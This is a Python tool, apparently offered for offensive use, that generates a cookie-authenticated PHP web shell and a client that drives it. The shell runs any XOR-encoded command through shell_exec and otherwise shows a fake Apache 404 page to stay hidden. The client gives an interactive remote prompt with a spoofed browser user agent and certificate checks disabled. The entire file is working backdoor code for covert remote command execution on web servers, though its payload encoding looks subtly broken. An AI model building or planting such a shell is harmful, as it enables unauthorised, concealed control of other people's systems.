#!/usr/bin/env python3

import argparse
import os
import random
import string
import sys

import requests
import bcrypt
from base64 import b64encode
from termcolor import colored


def generate_key(seed):
    salt = bcrypt.gensalt(rounds=12, prefix=b"2b")
    key = b64encode(bcrypt.hashpw(str(seed).encode("ascii"), salt))
    return key.decode()


def generate_shell(key, payload_key):
    shell = [
        "<?php",
        "$payload_key = '%s';" % payload_key,
        'if ($_COOKIE["session"] === "%s") {' % key,
        '  $payload = file_get_contents("php://input");',
        "  $command = base64_decode($payload) ^ $payload_key;",
        "  echo shell_exec($command);",
        "  } else {",
        "    http_response_code(404);",
        '    echo "<html><head>";',
        '    echo "<title>404 Not Found</title>";',
        '    echo "</head><body>";',
        '    echo "<h1>Not Found</h1>";',
        '    echo "<p>The requested URL was not found on this server.</p>";',
        '    echo "<hr>";',
        '    echo "<address>Apache Server at localhost Port 80</address>";',
        '    echo "</body></html>";',
        "    die();",
        "  }",
        "?>",
    ]

    with open("./shell.php", "w+") as file:
        for line in shell:
            file.write(line + "\n")
        file.close()
    print(colored("[+] ", "green") + "Created new shell.php file.")


def xor_function(s1, s2):
    return "".join([chr(ord(c1) ^ ord(c2)) for (c1, c2) in zip(s1, s2)])


def make_payload(cmd, payload_key):
    return b64encode(xor_function(cmd, payload_key)).encode("ascii")


def connect(args):
    payload_key = args.pkey
    url = args.connect
    hmac = args.key
    print(
        colored("[+] ", "blue")
        + "Connecting to %s\nUsing HMAC: %s\nUsing Payload Key: %s\n"
        % (url, hmac, payload_key)
    )
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
        "AppleWebKit/537.36 (KHTML, like Gecko) "
        "Chrome/81.0.4044.138 Safari/537.36",
    }
    cookies = {"session": hmac}
    with requests.Session() as session:
        session.headers = headers
        session.cookies.set(**cookies)

        while True:
            cmd = str(input(colored("shell~$ ", "yellow", attrs=["bold"])))
            if cmd in ("exit", "quit"):
                sys.exit(0)
            if cmd == "clear":
                try:
                    os.system("clear")
                except Exception:
                    os.system("cls")

            try:
                payload = make_payload(cmd, payload_key)
                response = session.post(url, data=payload, verify=False)
                print(response.text)
            except requests.exceptions.RequestException as e:
                print(e)


def generate(args):
    special_chars = '!@#%^&*()-=_+[]{}";:,./<>?'
    charset = string.ascii_letters + string.digits + special_chars
    seed = "".join(random.choices(charset, k=50))
    payload_key = "".join(random.choices(charset, k=8))
    key = generate_key(seed)
    print(colored("[+] ", "blue") + "Seed: " + seed)
    print(colored("[+] ", "blue") + "Payload Key: " + payload_key)
    print(colored("[+] ", "blue") + "Key: %s" % key)
    generate_shell(key, payload_key)


def main(args):
    if args.connect:
        connect(args)
    elif args.generate:
        generate(args)


if __name__ in "__main__":
    formatter = lambda prog: argparse.HelpFormatter(prog, max_help_position=50)
    parser = argparse.ArgumentParser(
        description="An Epic Web Shell - @cwinfosec", formatter_class=formatter
    )
    parser.add_argument(
        "-g",
        "--generate",
        dest="generate",
        help="Generate new key and webshell.",
        action="store_true",
        required=False,
    )
    parser.add_argument(
        "-c",
        "--connect",
        dest="connect",
        type=str,
        help="URL of web shell to connect to.",
        required=False,
    )
    parser.add_argument(
        "-k",
        "--key",
        dest="key",
        type=str,
        help="Auth key for the generated web shell.",
        required=False,
    )
    parser.add_argument(
        "-pk",
        "--payload-key",
        dest="pkey",
        help="Payload key for webshell.",
        required=False,
    )
    args = parser.parse_args()
    main(args)
